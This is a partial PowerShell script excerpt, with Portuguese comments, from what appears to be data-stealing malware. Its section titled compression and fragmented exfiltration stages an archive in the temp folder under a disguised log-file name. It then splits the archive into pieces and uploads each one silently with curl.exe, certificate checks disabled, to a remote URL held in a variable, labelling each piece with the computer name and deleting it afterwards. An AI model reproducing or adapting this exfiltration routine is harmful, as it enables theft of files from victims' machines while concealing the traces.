...
# 3. Compactação e Exfiltração Fragmentada
$zipFile = "$env:TEMP\win_log_bin.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    ...
    while ($bytes = $fileStream.Read($buffer, 0, $buffer.Length)) {
        ...
        curl.exe -k -s -F "file=@$pPath" -F "content=P$part de $env:COMPUTERNAME" $u
        Remove-Item $pPath
        $part++
